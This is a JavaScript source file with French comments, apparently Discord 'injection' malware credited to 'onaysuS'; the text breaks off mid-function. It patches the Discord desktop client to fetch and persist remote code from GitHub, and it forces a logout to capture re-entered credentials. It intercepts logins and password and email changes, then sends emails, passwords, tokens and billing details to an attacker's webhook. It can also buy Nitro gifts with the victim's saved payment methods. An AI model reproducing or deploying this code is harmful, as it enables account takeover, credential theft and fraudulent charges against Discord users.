// Obtenir les arguments de la ligne de commande
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

// Configuration
const config = {
  webhook: '%WEBHOOK%', // URL du webhook Discord
  webhook_protector_key: '%WEBHOOK_KEY%', // Clé de protection du webhook Discord
  auto_buy_nitro: false, // Option d'achat automatique de Nitro (true/false)
  ping_on_run: true, // Envoyer une notification "ping" lors de l'exécution (true/false)
  ping_val: '@everyone', // Valeur à utiliser pour la notification "ping"
  embed_name: 'onayasuS Injection', // Nom de l'intégration Discord
  embed_icon: 'https://raw.githubusercontent.com/onaysuS/onaysus/main/img/xd.png'.replace(/ /g, '%20'), // URL de l'icône de l'intégration (avec remplacement des espaces)
  embed_color: 2895667, // Couleur de l'intégration Discord (code couleur)
  injection_url: 'https://raw.githubusercontent.com/onaysuS/onaysus/main/index.js', // URL du fichier à injecter
  /**
   * API Discord
   **/
  api: 'https://discord.com/api/v9/users/@me',

  /**
   * Options d'achat Nitro
   **/
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },

  /**
   * Filtres d'URL
   **/
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },

  /**
   * Deuxième ensemble de filtres d'URL
   **/
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

// Fonction de parité pour 32 bits
function parity_32(x, y, z) {
  return x ^ y ^ z;
}

// Fonction de choix pour 32 bits
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

// Fonction de majorité pour 32 bits
function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}

// Fonction de rotation gauche pour 32 bits
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}

// Fonction d'addition sécurisée pour 32 bits (2 valeurs)
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}

// Fonction d'addition sécurisée pour 32 bits (5 valeurs)
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
// Fonction pour convertir un tableau binaire en chaîne hexadécimale
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef', // Tableau de correspondance pour les caractères hexadécimaux
    str = '', // Chaîne de résultat
    length = binarray.length * 4, // Longueur totale en bits
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8); // Sélection de l'octet source
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf); // Conversion en caractères hexadécimaux
  }

  return str; // Renvoie la chaîne hexadécimale résultante
}

// Fonction pour obtenir une valeur H initiale (tableau de 5 mots de 32 bits)
function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]; // Retourne un tableau de valeurs initiales
}
// Fonction pour effectuer un tour de calcul SHA-1 sur un bloc
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  // Initialisation des valeurs de hachage H avec les valeurs actuelles
  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      // Calcul des mots de la séquence W à partir des précédents
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      // Premier bloc de 20 étapes
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      // Deuxième bloc de 20 étapes
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      // Troisième bloc de 20 étapes
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      // Quatrième bloc de 20 étapes
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    // Mises à jour des valeurs de hachage
    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  // Mises à jour finales des valeurs de hachage H
  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H; // Retourne les nouvelles valeurs de hachage H après le tour de calcul
}

// Fonction pour finaliser le calcul SHA-1
function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  // Calcul de l'offset pour ajouter les données de longueur
  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;

  // Remplissage de la partie restante avec des zéros
  while (remainder.length <= offset) {
    remainder.push(0);
  }

  // Ajout du bit "1" à la fin des données
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));

  // Ajout de la longueur totale des données
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  // Traitement par blocs de 512 bits (16 mots de 32 bits)
  for (i = 0; i < appendedMessageLength; i += 16) {
    // Appel de la fonction roundSHA1 pour chaque bloc de données
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }

  return H; // Retourne les nouvelles valeurs de hachage H après la finalisation du calcul
}

// Fonction pour convertir une chaîne hexadécimale en tableau de mots binaires
function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  // Initialisation du tableau binaire ou utilisation du tableau existant
  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  // Vérification que la longueur de la chaîne est un multiple de 2 (en octets)
  if (0 !== length % 2) {
    console.error('La chaîne de type HEX doit être en incréments d\'octets');
  }

  // Parcours de la chaîne hexadécimale par paires de caractères
  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);

    // Vérification que le caractère est un chiffre hexadécimal valide
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;

      // Ajout d'octets au tableau binaire au besoin
      while (bin.length <= intOffset) {
        bin.push(0);
      }

      // Ajout de la valeur hexadécimale à l'octet correspondant
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('La chaîne de type HEX contient des caractères non valides');
    }
  }

  // Retourne le tableau binaire résultant et la longueur totale en bits
  return { value: bin, binLen: length * 4 + existingBinLen };
}

// Définition de la classe jsSHA
class jsSHA {
  constructor() {
    // Initialisation des variables de la classe
    var processedLen = 0, // Longueur de traitement
      remainder = [], // Tableau pour le reste des données
      remainderLen = 0, // Longueur du reste des données
      intermediateH, // Variable intermédiaire pour les hachages
      converterFunc, // Fonction de conversion
      outputBinLen, // Longueur de sortie en binaire
      variantBlockSize, // Taille de bloc variable
      roundFunc, // Fonction de hachage de tour
      finalizeFunc, // Fonction de finalisation
      finalized = false, // Indicateur de finalisation
      hmacKeySet = false, // Indicateur de clé HMAC définie
      keyWithIPad = [], // Clé avec le rembourrage intérieur
      keyWithOPad = [], // Clé avec le rembourrage extérieur
      numRounds, // Nombre de tours
      numRounds = 1; // Nombre de tours (défaut à 1)

    converterFunc = hex2binb; // Utilisation de la fonction hex2binb pour la conversion

    // Vérification du nombre de tours valide
    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds doit être un entier >= 1');
    }

    variantBlockSize = 512; // Taille de bloc variable
    roundFunc = roundSHA1; // Utilisation de la fonction de hachage SHA-1 par tour
    finalizeFunc = finalizeSHA1; // Utilisation de la fonction de finalisation SHA-1
    outputBinLen = 160; // Longueur de sortie en binaire
    intermediateH = getH(); // Obtention des valeurs de hachage initiales (H)

    // Définition de la méthode setHMACKey pour définir la clé HMAC
    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;

      // Utilisation de la fonction hex2binb pour convertir la clé en format binaire
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];

      // Calcul de la taille du bloc en octets
      blockByteSize = variantBlockSize >>> 3;

      // Calcul de l'indice du dernier élément dans le tableau
      lastArrayIndex = blockByteSize / 4 - 1;

      // Vérification et traitement de la clé en fonction de la taille du bloc
      if (blockByteSize < keyBinLen / 8) {
        // Finalisation de la clé si elle est trop longue
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());

        // Remplissage avec des zéros pour atteindre la taille du bloc
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }

        // Masquage du dernier octet pour le rembourrage
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        // Remplissage avec des zéros si la clé est plus courte que le bloc
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }

        // Masquage du dernier octet pour le rembourrage
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      // Application du rembourrage pour la clé interne et externe
      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      // Mise à jour des valeurs intermédiaires
      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      // Indicateur de clé HMAC définie
      hmacKeySet = true;
    };

    // Définition de la méthode update pour mettre à jour le hachage avec une chaîne source
    this.update = function (srcString) {
      var convertRet, chunkBinLen, chunkIntLen, chunk, i, updateProcessedLen = 0, variantBlockIntInc = variantBlockSize >>> 5;

      // Conversion de la chaîne source en format binaire
      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      // Calcul du nombre d'entiers dans le bloc
      chunkIntLen = chunkBinLen >>> 5;

      // Traitement des blocs de la chaîne source
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          // Mise à jour du hachage intermédiaire avec le bloc courant
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }

      // Mise à jour de la longueur totale traitée
      processedLen += updateProcessedLen;

      // Stockage du reste de la chaîne source
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

// Définition de la méthode getHMAC pour obtenir le code HMAC
    this.getHMAC = function () {
      var firstHash;

      // Vérification si la clé HMAC a été définie
      if (false === hmacKeySet) {
        console.error('Impossible d\'appeler getHMAC sans avoir d\'abord défini la clé HMAC');
      }

      // Fonction de formatage du résultat en hexadécimal
      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      // Si le calcul n'est pas finalisé, effectuer les étapes nécessaires
      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);

        // Mise à jour du hachage intermédiaire avec la clé de sortie
        intermediateH = roundFunc(keyWithOPad, getH());

        // Finalisation du hachage avec la première valeur
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      // Indiquer que le calcul est finalisé
      finalized = true;

      // Formater et renvoyer le résultat HMAC
      return formatFunc(intermediateH);
    };
  }
}

// Vérifie si le module JS est utilisé avec AMD (Asynchronous Module Definition)
if ('function' === typeof define && define['amd']) {
  // Définit le module AMD en renvoyant la classe jsSHA
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  // Vérifie si le code est exécuté dans un environnement Node.js ou similaire
  if ('undefined' !== typeof module && module['exports']) {
    // Exporte la classe jsSHA pour les modules Node.js
    module['exports'] = exports = jsSHA;
  } else {
    // Exporte la classe jsSHA pour les environnements de modules non spécifiés
    exports = jsSHA;
  }
} else {
  // Si aucun système de module n'est détecté, expose la classe jsSHA globalement
  global['jsSHA'] = jsSHA;
}

// Vérifie si jsSHA possède une propriété "default" (peut être utilisée avec des modules ES6)
if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

// Définition d'une fonction "totp" (Time-based One-Time Password) pour générer des OTP
function totp(key) {
  // Configuration des paramètres TOTP (période, nombre de chiffres, horodatage, etc.)
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');

  // Création d'une instance de la classe jsSHA pour le calcul HMAC
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));

  // Mise à jour de l'objet HMAC avec le temps
  shaObj.update(time);

  // Obtention du HMAC calculé
  const hmac = shaObj.getHMAC();

  // Calcul de l'offset en fonction de la dernière valeur hexadécimale du HMAC
  const offset = hex2dec(hmac.substring(hmac.length - 1));

  // Extraction des chiffres de l'OTP en utilisant l'offset
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';

  // Sélection des chiffres nécessaires pour l'OTP
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);

  // Renvoie l'OTP généré
  return otp;
}

// Fonction pour convertir une chaîne hexadécimale en décimal
function hex2dec(s) {
  return parseInt(s, 16);
}

// Fonction pour convertir un nombre décimal en chaîne hexadécimale
function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

// Fonction pour convertir une chaîne base32 en hexadécimal
function base32tohex(base32) {
  // Caractères de l'alphabet base32
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  let hex = '';

  // Supprime les caractères "=" en fin de chaîne base32
  base32 = base32.replace(/=+$/, '');

  // Convertit chaque caractère base32 en une séquence binaire de 5 bits
  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Caractère base32 invalide dans la clé');
    bits += leftpad(val.toString(2), 5, '0');
  }

  // Convertit les séquences binaires de 8 bits en hexadécimal
  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

// Fonction pour ajouter un rembourrage à gauche à une chaîne pour atteindre une longueur donnée
function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

// Fonction auto-invoquée (IIFE) pour obtenir le chemin du répertoire de ressources Discord
const discordPath = (function () {
  // Obtenir le chemin complet de l'exécutable de l'application Discord (chemin du fichier exécutable)
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  // Vérifier la plate-forme d'exécution (Windows)
  if (process.platform === 'win32') {
    // Construire le chemin du répertoire de ressources sur Windows
    resourcePath = path.join(app, 'resources');
  }
  // Vérifier la plate-forme d'exécution (macOS)
  else if (process.platform === 'darwin') {
    // Construire le chemin du répertoire de ressources sur macOS
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  // Vérifier si le répertoire de ressources existe
  if (fs.existsSync(resourcePath)) {
    // Si le répertoire existe, renvoyer le chemin du répertoire de ressources et le chemin de l'application
    return { resourcePath, app };
  } else {
    // Si le répertoire n'existe pas, renvoyer des valeurs indéfinies pour les chemins
    return { undefined, undefined };
  }
})();

// Fonction de vérification de mise à jour ou de modification
function updateCheck() {
  // Obtenir les chemins du répertoire de ressources et de l'application Discord
  const { resourcePath, app } = discordPath;

  // Vérifier si les chemins sont définis (non indéfinis)
  if (resourcePath === undefined || app === undefined) return;

  // Construire le chemin du répertoire "app"
  const appPath = path.join(resourcePath, 'app');

  // Construire le chemin du fichier "package.json" dans le répertoire "app"
  const packageJson = path.join(appPath, 'package.json');

  // Construire le chemin du fichier "index.js" dans le répertoire "app"
  const resourceIndex = path.join(appPath, 'index.js');

  // Chemin du fichier "index.js" de Discord
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;

  // Chemin du fichier "betterdiscord.asar"
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');

  // Créer le répertoire "app" s'il n'existe pas
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);

  // Supprimer le fichier "package.json" s'il existe
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);

  // Supprimer le fichier "index.js" s'il existe
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  // Vérifier la plate-forme d'exécution (Windows ou macOS)
  if (process.platform === 'win32' || process.platform === 'darwin') {
    // Écrire le contenu du fichier "package.json" avec certaines données
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    // Définir le contenu du script de démarrage
    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;

    // Écrire le contenu du fichier "index.js" avec le script de démarrage
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }

  // Vérifier l'existence d'un répertoire appelé "initiation"
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;

  // Supprimer le répertoire "initiation" s'il existe
  fs.rmdirSync(path.join(__dirname, 'initiation'));

  // Exécuter un script spécifique
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );

  // Retourner "false" pour indiquer que la mise à jour ou la modification a été effectuée
  return !1;
}

// Fonction pour exécuter un script dans la fenêtre du navigateur
const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

// Fonction pour obtenir des informations à partir d'un token
const getInfo = async (token) => {
  // Exécute un script pour effectuer une requête XMLHttpRequest
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  // Parse la réponse JSON obtenue
  return JSON.parse(info);
};

// Fonction pour récupérer les informations de facturation à partir d'un token
const fetchBilling = async (token) => {
  // Exécute un script pour effectuer une requête XMLHttpRequest
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  // Vérifie si la réponse n'est pas vide et renvoie les informations de facturation
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

// Fonction pour obtenir les informations de facturation
const getBilling = async (token) => {
  // Appelle la fonction fetchBilling pour récupérer les données de facturation
  const data = await fetchBilling(token);

  // Vérifie si les données sont vides ou inexistantes
  if (!data) return '❌';

  // Initialise une chaîne vide pour stocker les informations de facturation
  let billing = '';

  // Parcourt les données de facturation
  data.forEach((x) => {
    // Vérifie si l'élément n'est pas invalide
    if (!x.invalid) {
      // Selon le type de paiement, ajoute un emoji correspondant à la chaîne de facturation
      switch (x.type) {
        case 1:
          billing += '💳 '; // Carte de crédit
          break;
        case 2:
          billing += '<:paypal:951139189389410365> '; // PayPal
          break;
      }
    }
  });

  // Si aucune information de facturation n'a été ajoutée, met à jour la chaîne avec un emoji d'indisponibilité
  if (!billing) billing = '❌';

  // Renvoie la chaîne d'informations de facturation
  return billing;
};

// Fonction pour effectuer un achat
const Purchase = async (token, id, _type, _time) => {
  // Définit les options de l'achat
  const options = {
    expected_amount: config.nitro[_type][_time]['price'], // Montant attendu en USD
    expected_currency: 'usd', // Devise attendue (USD)
    gift: true, // Achat sous forme de cadeau
    payment_source_id: id, // Identifiant de la source de paiement
    payment_source_token: null, // Token de la source de paiement (null dans cet exemple)
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97', // Token d'achat
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'], // Identifiant du plan d'abonnement SKU
  };

  // Effectue une requête HTTP POST pour effectuer l'achat
  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);

  // Vérifie si un code cadeau a été obtenu en réponse
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code']; // Retourne le lien du code cadeau Discord
  } else {
    return null; // Aucun code cadeau obtenu en réponse
  }
};

// Fonction pour acheter Nitro
const buyNitro = async (token) => {
  // Récupère les données de facturation en utilisant le token Discord
  const data = await fetchBilling(token);

  // Message d'échec par défaut
  const failedMsg = 'Achat échoué ❌';

  // Si aucune donnée n'a été récupérée, retourne le message d'échec
  if (!data) return failedMsg;

  let IDS = [];

  // Parcourt les données de facturation pour récupérer les identifiants valides
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });

  // Parcourt les identifiants valides
  for (let sourceID in IDS) {
    // Tente d'acheter Nitro Boost annuel
    const first = Purchase(token, sourceID, 'boost', 'year');

    // Si l'achat réussit, retourne le lien du code cadeau Discord
    if (first !== null) {
      return first;
    } else {
      // Sinon, tente d'acheter Nitro Boost mensuel
      const second = Purchase(token, sourceID, 'boost', 'month');

      // Si l'achat réussit, retourne le lien du code cadeau Discord
      if (second !== null) {
        return second;
      } else {
        // Sinon, tente d'acheter Nitro Classic mensuel
        const third = Purchase(token, sourceID, 'classic', 'month');

        // Si l'achat réussit, retourne le lien du code cadeau Discord
        if (third !== null) {
          return third;
        } else {
          // Si tous les achats échouent pour cet identifiant, passe à l'identifiant suivant
          continue;
        }
      }
    }
  }

  // Si aucun achat n'a réussi pour tous les identifiants valides, retourne le message d'échec
  return failedMsg;
};

// Fonction pour obtenir le niveau de Nitro en fonction des indicateurs (flags)
const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return 'Pas de Nitro';
    case 1:
      return 'Nitro Classic';
    case 2:
      return 'Nitro Boost';
    default:
      return 'Pas de Nitro';
  }
};

// Fonction pour obtenir les badges en fonction des indicateurs (flags)
const getBadges = (flags) => {
  let badges = '';
  switch (flags) {
    case 1:
      badges += 'Équipe Discord, ';
      break;
    case 2:
      badges += 'Propriétaire de serveur partenaire, ';
      break;
    case 131072:
      badges += 'Développeur de bot vérifié, ';
      break;
    case 4:
      badges += 'Hypesquad Événement, ';
      break;
    case 16384:
      badges += 'Chasseur de bugs Gold, ';
      break;
    case 8:
      badges += 'Chasseur de bugs Green, ';
      break;
    case 512:
      badges += 'Supporter précoce, ';
      break;
    case 128:
      badges += 'HypeSquad Brillance, ';
      break;
    case 64:
      badges += 'HypeSquad Bravery, ';
      break;
    case 256:
      badges += 'HypeSquad Balance, ';
      break;
    case 0:
      badges = 'Aucun';
      break;
    default:
      badges = 'Aucun';
      break;
  }
  return badges;
};

// Fonction pour envoyer des données vers un webhook Discord
const hooker = async (content) => {
  // Convertir le contenu en format JSON
  const data = JSON.stringify(content);

  // Analyser l'URL du webhook
  const url = new URL(config.webhook);

  // Définir les en-têtes de la requête
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };

  // Vérifier si le webhook ne contient pas 'api/webhooks'
  if (!config.webhook.includes('api/webhooks')) {
    // Générer une clé d'authentification en utilisant TOTP (Time-based One-Time Password)
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }

  // Options de la requête HTTP
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };

  // Créer une requête HTTPS
  const req = https.request(options);

  // Gérer les erreurs de la requête
  req.on('error', (err) => {
    console.log(err);
  });

  // Écrire les données (contenu JSON) dans la requête
  req.write(data);

  // Terminer la requête
  req.end();
};

// Fonction pour collecter des informations et envoyer un message à un webhook Discord
const login = async (email, password, token) => {
  // Obtenir les informations de l'utilisateur Discord en utilisant le token
  const json = await getInfo(token);

  // Obtenir le type de Nitro de l'utilisateur
  const nitro = getNitro(json.premium_type);

  // Obtenir les badges de l'utilisateur
  const badges = getBadges(json.flags);

  // Obtenir les informations de facturation de l'utilisateur
  const billing = await getBilling(token);

  // Créer un objet JSON contenant les informations à envoyer au webhook
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Informations du Compte**',
            value: `Email: **${email}** - Mot de passe: **${password}**`,
            inline: false,
          },
          {
            name: '**Informations Discord**',
            value: `Type de Nitro: **${nitro}**\nBadges: **${badges}**\nFacturation: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Injection Discord par onaysuS・',
        },
      },
    ],
  };

  // Ajouter un ping au contenu si configuré
  if (config.ping_on_run) content['content'] = config.ping_val;

  // Envoyer le contenu au webhook Discord
  hooker(content);
};

// Fonction pour signaler un changement de mot de passe et envoyer un message à un webhook Discord
const passwordChanged = async (oldpassword, newpassword, token) => {
  // Obtenir les informations de l'utilisateur Discord en utilisant le token
  const json = await getInfo(token);

  // Obtenir le type de Nitro de l'utilisateur
  const nitro = getNitro(json.premium_type);

  // Obtenir les badges de l'utilisateur
  const badges = getBadges(json.flags);

  // Obtenir les informations de facturation de l'utilisateur
  const billing = await getBilling(token);

  // Créer un objet JSON contenant les informations à envoyer au webhook
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        fields: [
          {
            name: '**Changement de Mot de Passe**',
            value: `Email: **${json.email}**\nAncien Mot de Passe: **${oldpassword}**\nNouveau Mot de Passe: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Informations Discord**',
            value: `Type de Nitro: **${nitro}**\nBadges: **${badges}**\nFacturation: **${billing}**`,
            inline: true,
          },
          {
            name: '**Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
          text: '🎉・Injection Discord par onaysuS・',
        },
      },
    ],
  };

  // Ajouter un ping au contenu si configuré
  if (config.ping_on_run) content['content'] = config.ping_val;

  // Envoyer le contenu au webhook Discord
  hooker(content);
};

// Fonction pour signaler un changement d'adresse e-mail et envoyer un message à un webhook Discord
const emailChanged = async (email, password, token) => {
  // Obtenir les informations de l'utilisateur Discord en utilisant le token
  const json = await getInfo(token);

  // Obtenir le type de Nitro de l'utilisateur
  const nitro = getNitro(json.premium_type);

  // Obtenir les badges de l'utilisateur
  const badges = getBadges(json.flags);

  // Obtenir les informations de facturation de l'utilisateur
  const billing = await getBilling(token);

  // Créer un objet JSON contenant les informations à envoyer au webhook
  const content = {
    username: config.embed_name,
